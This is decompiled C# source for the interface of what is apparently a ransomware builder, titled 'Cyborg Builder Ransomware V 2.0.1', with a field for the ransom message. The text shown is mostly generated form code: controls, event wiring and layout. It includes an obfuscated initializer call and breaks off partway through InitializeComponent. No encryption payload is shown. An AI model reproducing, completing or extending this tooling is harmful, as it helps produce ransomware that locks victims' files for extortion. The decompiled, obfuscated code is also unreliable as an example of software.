using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace builder;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> list_0;

	private IContainer icontainer_0;

	[AccessedThroughProperty("BlackShadesNetForm1")]
	private BlackShadesNetForm _BlackShadesNetForm1;

	[AccessedThroughProperty("Panel1")]
	private Panel _Panel1;

	[AccessedThroughProperty("Panel2")]
	private Panel _Panel2;

	[AccessedThroughProperty("CheckBox6")]
	private CheckBox _CheckBox6;

	[AccessedThroughProperty("Panel5")]
	private Panel _Panel5;

	[AccessedThroughProperty("CheckBox4")]
	private CheckBox _CheckBox4;

	[AccessedThroughProperty("CheckBox3")]
	private CheckBox _CheckBox3;

	[AccessedThroughProperty("Panel4")]
	private Panel _Panel4;

	[AccessedThroughProperty("Textbox6")]
	private TextBox _Textbox6;

	[AccessedThroughProperty("Label6")]
	private Label _Label6;

	[AccessedThroughProperty("TextBox2")]
	private TextBox _TextBox2;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label8")]
	private Label _Label8;

	[AccessedThroughProperty("Label7")]
	private Label _Label7;

	[AccessedThroughProperty("Panel3")]
	private Panel _Panel3;

	[AccessedThroughProperty("CheckBox5")]
	private CheckBox _CheckBox5;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox FsTodTooFl;

	[AccessedThroughProperty("PictureBox2")]
	private PictureBox _PictureBox2;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("TextBox3")]
	private TextBox rxWoDoJape;

	[AccessedThroughProperty("BlackShadesNetButton1")]
	private BlackShadesNetButton _BlackShadesNetButton1;

	[AccessedThroughProperty("RadioButton2")]
	private RadioButton _RadioButton2;

	[AccessedThroughProperty("RadioButton11")]
	private RadioButton _RadioButton11;

	[AccessedThroughProperty("Timer1")]
	private Timer timer_0;

	[AccessedThroughProperty("RadioButton3")]
	private RadioButton _RadioButton3;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("Panel6")]
	private Panel _Panel6;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("Label4")]
	private Label WqtovyafvE;

	[AccessedThroughProperty("TextBox5")]
	private TextBox _TextBox5;

	[AccessedThroughProperty("RadioButton4")]
	private RadioButton _RadioButton4;

	[AccessedThroughProperty("CheckBox2")]
	private CheckBox _CheckBox2;

	[AccessedThroughProperty("تأثيرالماء1")]
	private GClass0 gclass0_0;

	[AccessedThroughProperty("TextBox8")]
	private TextBox _TextBox8;

	[AccessedThroughProperty("Label5")]
	private Label _Label5;

	[AccessedThroughProperty("Label9")]
	private Label _Label9;

	[AccessedThroughProperty("BlackShadesNetTopButton1")]
	private BlackShadesNetTopButton _BlackShadesNetTopButton1;

	private bool bool_0;

	internal virtual BlackShadesNetForm BlackShadesNetForm1
	{
		[DebuggerNonUserCode]
		get
		{
			return _BlackShadesNetForm1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_BlackShadesNetForm1 = value;
		}
	}

	internal virtual Panel Panel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel1 = value;
		}
	}

	internal virtual Panel Panel2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel2 = value;
		}
	}

	internal virtual CheckBox CheckBox6
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = method_15;
			EventHandler eventHandler2 = method_5;
			if (_CheckBox6 != null)
			{
				((Control)_CheckBox6).remove_MouseHover(eventHandler);
				_CheckBox6.remove_CheckedChanged(eventHandler2);
			}
			_CheckBox6 = value;
			if (_CheckBox6 != null)
			{
				((Control)_CheckBox6).add_MouseHover(eventHandler);
				_CheckBox6.add_CheckedChanged(eventHandler2);
			}
		}
	}

	internal virtual Panel Panel5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel5 = value;
		}
	}

	internal virtual CheckBox CheckBox4
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = method_3;
			EventHandler eventHandler2 = method_12;
			if (_CheckBox4 != null)
			{
				_CheckBox4.remove_CheckedChanged(eventHandler);
				((Control)_CheckBox4).remove_MouseHover(eventHandler2);
			}
			_CheckBox4 = value;
			if (_CheckBox4 != null)
			{
				_CheckBox4.add_CheckedChanged(eventHandler);
				((Control)_CheckBox4).add_MouseHover(eventHandler2);
			}
		}
	}

	internal virtual CheckBox CheckBox3
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = method_2;
			EventHandler eventHandler2 = xaMooqfcfY;
			if (_CheckBox3 != null)
			{
				_CheckBox3.remove_CheckedChanged(eventHandler);
				((Control)_CheckBox3).remove_MouseHover(eventHandler2);
			}
			_CheckBox3 = value;
			if (_CheckBox3 != null)
			{
				_CheckBox3.add_CheckedChanged(eventHandler);
				((Control)_CheckBox3).add_MouseHover(eventHandler2);
			}
		}
	}

	internal virtual Panel Panel4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel4 = value;
		}
	}

	internal virtual TextBox Textbox6
	{
		[DebuggerNonUserCode]
		get
		{
			return _Textbox6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Textbox6 = value;
		}
	}

	internal virtual Label Label6
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label6 = value;
		}
	}

	internal virtual TextBox TextBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox2 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label8
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label8 = value;
		}
	}

	internal virtual Label Label7
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label7 = value;
		}
	}

	internal virtual Panel Panel3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Panel3_MouseHover;
			if (_Panel3 != null)
			{
				((Control)_Panel3).remove_MouseHover(eventHandler);
			}
			_Panel3 = value;
			if (_Panel3 != null)
			{
				((Control)_Panel3).add_MouseHover(eventHandler);
			}
		}
	}

	internal virtual CheckBox CheckBox5
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = method_4;
			EventHandler eventHandler2 = rkgoYvffSA;
			if (_CheckBox5 != null)
			{
				_CheckBox5.remove_CheckedChanged(eventHandler);
				((Control)_CheckBox5).remove_MouseHover(eventHandler2);
			}
			_CheckBox5 = value;
			if (_CheckBox5 != null)
			{
				_CheckBox5.add_CheckedChanged(eventHandler);
				((Control)_CheckBox5).add_MouseHover(eventHandler2);
			}
		}
	}

	internal virtual CheckBox CheckBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return FsTodTooFl;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = CheckBox1_CheckedChanged;
			if (FsTodTooFl != null)
			{
				FsTodTooFl.remove_CheckedChanged(eventHandler);
			}
			FsTodTooFl = value;
			if (FsTodTooFl != null)
			{
				FsTodTooFl.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual PictureBox PictureBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = PictureBox2_Click;
			if (_PictureBox2 != null)
			{
				((Control)_PictureBox2).remove_Click(eventHandler);
			}
			_PictureBox2 = value;
			if (_PictureBox2 != null)
			{
				((Control)_PictureBox2).add_Click(eventHandler);
			}
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PictureBox1 = value;
		}
	}

	internal virtual TextBox TextBox3
	{
		[DebuggerNonUserCode]
		get
		{
			return rxWoDoJape;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			rxWoDoJape = value;
		}
	}

	internal virtual BlackShadesNetButton BlackShadesNetButton1
	{
		[DebuggerNonUserCode]
		get
		{
			return _BlackShadesNetButton1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = BlackShadesNetButton1_Click;
			if (_BlackShadesNetButton1 != null)
			{
				((Control)_BlackShadesNetButton1).remove_Click(eventHandler);
			}
			_BlackShadesNetButton1 = value;
			if (_BlackShadesNetButton1 != null)
			{
				((Control)_BlackShadesNetButton1).add_Click(eventHandler);
			}
		}
	}

	internal virtual RadioButton RadioButton2
	{
		[DebuggerNonUserCode]
		get
		{
			return _RadioButton2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RadioButton2_CheckedChanged;
			if (_RadioButton2 != null)
			{
				_RadioButton2.remove_CheckedChanged(eventHandler);
			}
			_RadioButton2 = value;
			if (_RadioButton2 != null)
			{
				_RadioButton2.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual RadioButton RadioButton11
	{
		[DebuggerNonUserCode]
		get
		{
			return _RadioButton11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RadioButton11_CheckedChanged;
			if (_RadioButton11 != null)
			{
				_RadioButton11.remove_CheckedChanged(eventHandler);
			}
			_RadioButton11 = value;
			if (_RadioButton11 != null)
			{
				_RadioButton11.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual RadioButton RadioButton3
	{
		[DebuggerNonUserCode]
		get
		{
			return _RadioButton3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RadioButton3_CheckedChanged;
			if (_RadioButton3 != null)
			{
				_RadioButton3.remove_CheckedChanged(eventHandler);
			}
			_RadioButton3 = value;
			if (_RadioButton3 != null)
			{
				_RadioButton3.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual Panel Panel6
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel6 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual Label Label4
	{
		[DebuggerNonUserCode]
		get
		{
			return WqtovyafvE;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			WqtovyafvE = value;
		}
	}

	internal virtual TextBox TextBox5
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox5 = value;
		}
	}

	internal virtual RadioButton RadioButton4
	{
		[DebuggerNonUserCode]
		get
		{
			return _RadioButton4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RadioButton4_CheckedChanged;
			if (_RadioButton4 != null)
			{
				_RadioButton4.remove_CheckedChanged(eventHandler);
			}
			_RadioButton4 = value;
			if (_RadioButton4 != null)
			{
				_RadioButton4.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual CheckBox CheckBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = method_13;
			EventHandler eventHandler2 = method_7;
			if (_CheckBox2 != null)
			{
				((Control)_CheckBox2).remove_MouseHover(eventHandler);
				_CheckBox2.remove_CheckedChanged(eventHandler2);
			}
			_CheckBox2 = value;
			if (_CheckBox2 != null)
			{
				((Control)_CheckBox2).add_MouseHover(eventHandler);
				_CheckBox2.add_CheckedChanged(eventHandler2);
			}
		}
	}

	internal virtual GClass0 GClass0_0
	{
		[DebuggerNonUserCode]
		get
		{
			return gclass0_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			gclass0_0 = value;
		}
	}

	internal virtual TextBox TextBox8
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox8 = value;
		}
	}

	internal virtual Label Label5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label5 = value;
		}
	}

	internal virtual Label Label9
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Label9_MouseHover;
			if (_Label9 != null)
			{
				((Control)_Label9).remove_MouseHover(eventHandler);
			}
			_Label9 = value;
			if (_Label9 != null)
			{
				((Control)_Label9).add_MouseHover(eventHandler);
			}
		}
	}

	internal virtual BlackShadesNetTopButton BlackShadesNetTopButton1
	{
		[DebuggerNonUserCode]
		get
		{
			return _BlackShadesNetTopButton1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = BlackShadesNetTopButton1_Click;
			if (_BlackShadesNetTopButton1 != null)
			{
				((Control)_BlackShadesNetTopButton1).remove_Click(eventHandler);
			}
			_BlackShadesNetTopButton1 = value;
			if (_BlackShadesNetTopButton1 != null)
			{
				((Control)_BlackShadesNetTopButton1).add_Click(eventHandler);
			}
		}
	}

	[DebuggerNonUserCode]
	static Form1()
	{
		Class14.hYiyYvszsKHjE();
		list_0 = new List<WeakReference>();
	}

	public Form1()
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		Class14.hYiyYvszsKHjE();
		((Form)this)._002Ector();
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		smethod_0(this);
		bool_0 = true;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void smethod_0(object object_0)
	{
		checked
		{
			lock (list_0)
			{
				if (list_0.Count == list_0.Capacity)
				{
					int num = 0;
					int num2 = list_0.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = list_0[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								list_0[num] = list_0[num3];
							}
							num++;
						}
						num3++;
					}
					list_0.RemoveRange(num, list_0.Count - num);
					list_0.Capacity = list_0.Count;
				}
				list_0.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && icontainer_0 != null) ? true : false)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Expected O, but got Unknown
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Expected O, but got Unknown
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Expected O, but got Unknown
		//IL_00b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bc: Expected O, but got Unknown
		//IL_00bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Expected O, but got Unknown
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Expected O, but got Unknown
		//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dd: Expected O, but got Unknown
		//IL_00de: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Expected O, but got Unknown
		//IL_00e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f3: Expected O, but got Unknown
		//IL_00f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fe: Expected O, but got Unknown
		//IL_00ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0109: Expected O, but got Unknown
		//IL_010a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0114: Expected O, but got Unknown
		//IL_0115: Unknown result type (might be due to invalid IL or missing references)
		//IL_011f: Expected O, but got Unknown
		//IL_0120: Unknown result type (might be due to invalid IL or missing references)
		//IL_012a: Expected O, but got Unknown
		//IL_012b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0135: Expected O, but got Unknown
		//IL_0136: Unknown result type (might be due to invalid IL or missing references)
		//IL_0140: Expected O, but got Unknown
		//IL_0141: Unknown result type (might be due to invalid IL or missing references)
		//IL_014b: Expected O, but got Unknown
		//IL_014c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0156: Expected O, but got Unknown
		//IL_0157: Unknown result type (might be due to invalid IL or missing references)
		//IL_0161: Expected O, but got Unknown
		//IL_0162: Unknown result type (might be due to invalid IL or missing references)
		//IL_016c: Expected O, but got Unknown
		//IL_016d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0177: Expected O, but got Unknown
		//IL_0178: Unknown result type (might be due to invalid IL or missing references)
		//IL_0182: Expected O, but got Unknown
		//IL_0183: Unknown result type (might be due to invalid IL or missing references)
		//IL_018d: Expected O, but got Unknown
		//IL_018e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0198: Expected O, but got Unknown
		//IL_0199: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a3: Expected O, but got Unknown
		//IL_01a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ae: Expected O, but got Unknown
		//IL_01af: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b9: Expected O, but got Unknown
		//IL_01ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c4: Expected O, but got Unknown
		//IL_0282: Unknown result type (might be due to invalid IL or missing references)
		//IL_028c: Expected O, but got Unknown
		//IL_033b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0345: Expected O, but got Unknown
		//IL_0463: Unknown result type (might be due to invalid IL or missing references)
		//IL_046d: Expected O, but got Unknown
		//IL_04e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_04f1: Expected O, but got Unknown
		//IL_0693: Unknown result type (might be due to invalid IL or missing references)
		//IL_069d: Expected O, but got Unknown
		//IL_08ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_08f9: Expected O, but got Unknown
		//IL_099f: Unknown result type (might be due to invalid IL or missing references)
		//IL_09a9: Expected O, but got Unknown
		//IL_0c47: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c51: Expected O, but got Unknown
		//IL_0ce6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cf0: Expected O, but got Unknown
		//IL_0d92: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d9c: Expected O, but got Unknown
		//IL_0e3d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e47: Expected O, but got Unknown
		//IL_0eeb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ef5: Expected O, but got Unknown
		//IL_0f96: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fa0: Expected O, but got Unknown
		//IL_19f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a03: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		vmethod_1(new Timer(icontainer_0));
		BlackShadesNetForm1 = new BlackShadesNetForm();
		BlackShadesNetTopButton1 = new BlackShadesNetTopButton();
		Panel1 = new Panel();
		GClass0_0 = new GClass0();
		PictureBox1 = new PictureBox();
		Panel2 = new Panel();
		Label2 = new Label();
		Panel6 = new Panel();
		TextBox5 = new TextBox();
		RadioButton11 = new RadioButton();
		Label3 = new Label();
		BlackShadesNetButton1 = new BlackShadesNetButton();
		CheckBox1 = new CheckBox();
		Panel5 = new Panel();
		Label9 = new Label();
		CheckBox2 = new CheckBox();
		Label4 = new Label();
		CheckBox5 = new CheckBox();
		CheckBox6 = new CheckBox();
		CheckBox4 = new CheckBox();
		CheckBox3 = new CheckBox();
		Panel4 = new Panel();
		TextBox8 = new TextBox();
		Label5 = new Label();
		TextBox3 = new TextBox();
		Textbox6 = new TextBox();
		Label6 = new Label();
		TextBox2 = new TextBox();
		TextBox1 = new TextBox();
		Label1 = new Label();
		Label8 = new Label();
		Label7 = new Label();
		Panel3 = new Panel();
		RadioButton4 = new RadioButton();
		RadioButton3 = new RadioButton();
		RadioButton2 = new RadioButton();
		PictureBox2 = new PictureBox();
		((Control)BlackShadesNetForm1).SuspendLayout();
		((Control)Panel1).SuspendLayout();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)Panel2).SuspendLayout();
		((Control)Panel6).SuspendLayout();
		((Control)Panel5).SuspendLayout();
		((Control)Panel4).SuspendLayout();
		((Control)Panel3).SuspendLayout();
		((ISupportInitialize)PictureBox2).BeginInit();
		((Control)this).SuspendLayout();
		BlackShadesNetForm1.CloseButtonExitsApp = false;
		((Control)BlackShadesNetForm1).get_Controls().Add((Control)(object)BlackShadesNetTopButton1);
		((Control)BlackShadesNetForm1).get_Controls().Add((Control)(object)Panel1);
		((Control)BlackShadesNetForm1).set_Dock((DockStyle)5);
		((Control)BlackShadesNetForm1).set_Font(new Font("Trebuchet MS", 8.25f, (FontStyle)1));
		((Control)BlackShadesNetForm1).set_ForeColor(Color.FromArgb(142, 152, 156));
		BlackShadesNetForm blackShadesNetForm = BlackShadesNetForm1;
		Point location = new Point(0, 0);
		((Control)blackShadesNetForm).set_Location(location);
		BlackShadesNetForm1.MinimizeButton = true;
		((Control)BlackShadesNetForm1).set_Name("BlackShadesNetForm1");
		BlackShadesNetForm blackShadesNetForm2 = BlackShadesNetForm1;
		Size size = new Size(492, 516);
		((Control)blackShadesNetForm2).set_Size(size);
		((Control)BlackShadesNetForm1).set_TabIndex(0);
		((Control)BlackShadesNetForm1).set_Text(" Cyborg Builder Ransomware V 2.0.1");
		((Control)BlackShadesNetTopButton1).set_BackColor(Color.FromArgb(38, 38, 38));
		((Control)BlackShadesNetTopButton1).set_Font(new Font("Verdana", 8.25f));
		BlackShadesNetTopButton blackShadesNetTopButton = BlackShadesNetTopButton1;
		location = new Point(465, 8);
		((Control)blackShadesNetTopButton).set_Location(location);
		((Control)BlackShadesNetTopButton1).set_Name("BlackShadesNetTopButton1");
		BlackShadesNetTopButton blackShadesNetTopButton2 = BlackShadesNetTopButton1;
		size = new Size(15, 11);
		((Control)blackShadesNetTopButton2).set_Size(size);
		((Control)BlackShadesNetTopButton1).set_TabIndex(1);
		((Control)BlackShadesNetTopButton1).set_Text("BlackShadesNetTopButton1");
		((Control)Panel1).set_BackColor(Color.Black);
		((Control)Panel1).get_Controls().Add((Control)(object)GClass0_0);
		((Control)Panel1).get_Controls().Add((Control)(object)PictureBox1);
		((Control)Panel1).get_Controls().Add((Control)(object)Panel2);
		Panel panel = Panel1;
		location = new Point(0, 25);
		((Control)panel).set_Location(location);
		((Control)Panel1).set_Name("Panel1");
		Panel panel2 = Panel1;
		size = new Size(492, 491);
		((Control)panel2).set_Size(size);
		((Control)Panel1).set_TabIndex(2);
		((Control)GClass0_0).set_BackColor(Color.Transparent);
		GClass0_0.ImageBitmap = (Bitmap)componentResourceManager.GetObject("تأثيرالماء1.ImageBitmap");
		GClass0 gClass0_ = GClass0_0;
		location = new Point(-10, 3);
		((Control)gClass0_).set_Location(location);
		((Control)GClass0_0).set_Name("تأثيرالماء1");
		GClass0_0.Scale = 1;
		GClass0 gClass0_2 = GClass0_0;
		size = new Size(502, 202);
		((Control)gClass0_2).set_Size(size);
		((Control)GClass0_0).set_TabIndex(35);
		((Control)PictureBox1).set_Anchor((AnchorStyles)9);
		PictureBox1.set_Image((Image)componentResourceManager.GetObject("PictureBox1.Image"));
		PictureBox1.set_ImeMode((ImeMode)0);
		PictureBox pictureBox = PictureBox1;
		location = new Point(16, 3);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox2 = PictureBox1;
		size = new Size(464, 202);
		((Control)pictureBox2).set_Size(size);
		PictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox1.set_TabIndex(34);
		PictureBox1.set_TabStop(false);
		((Control)Panel2).get_Controls().Add((Control)(object)Label2);
		((Control)Panel2).get_Controls().Add((Control)(object)Panel6);
		((Control)Panel2).get_Controls().Add((Control)(object)Label3);
		((Control)Panel2).get_Controls().Add((Control)(object)BlackShadesNetButton1);
		((Control)Panel2).get_Controls().Add((Control)(object)CheckBox1);
		((Control)Panel2).get_Controls().Add((Control)(object)Panel5);
		((Control)Panel2).get_Controls().Add((Control)(object)Panel4);
		((Control)Panel2).get_Controls().Add((Control)(object)Panel3);
		Panel panel3 = Panel2;
		location = new Point(0, 198);
		((Control)panel3).set_Location(location);
		((Control)Panel2).set_Name("Panel2");
		Panel panel4 = Panel2;
		size = new Size(492, 293);
		((Control)panel4).set_Size(size);
		((Control)Panel2).set_TabIndex(33);
		Label2.set_AutoSize(true);
		Label2.set_FlatStyle((FlatStyle)0);
		((Control)Label2).set_Font(new Font("Trebuchet MS", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_ForeColor(Color.White);
		Label2.set_ImeMode((ImeMode)0);
		Label label = Label2;
		location = new Point(218, 161);
		((Control)label).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label2 = Label2;
		size = new Size(140, 18);
		((Control)label2).set_Size(size);
		((Control)Label2).set_TabIndex(51);
		Label2.set_Text("Your msg Txt Ransom ");
		((Control)Panel6).get_Controls().Add((Control)(object)TextBox5);
		((Control)Panel6).get_Controls().Add((Control)(object)RadioButton11);
		Panel panel5 = Panel6;
		location = new Point(221, 182);
		((Control)panel5).set_Location(location);
		((Control)Panel6).set_Name("Panel6");
		Panel panel6 = Panel6;
		size = new Size(156, 88);
		((Control)panel6).set_Size(size);
		((Control)Panel6).set_TabIndex(49);
		((TextBoxBase)TextBox5).set_BackColor(Color.Black);
		((TextBoxBase)TextBox5).set_BorderStyle((BorderStyle)0);
		((TextBoxBase)TextBox5).set_ForeColor(Color.DodgerBlue);
		TextBox textBox = TextBox5;
		location = new Point(0, 0);
		((Control)textBox).set_Location(location);
		TextBox5.set_Multiline(true);
		((Control)TextBox5).set_Name("TextBox5");
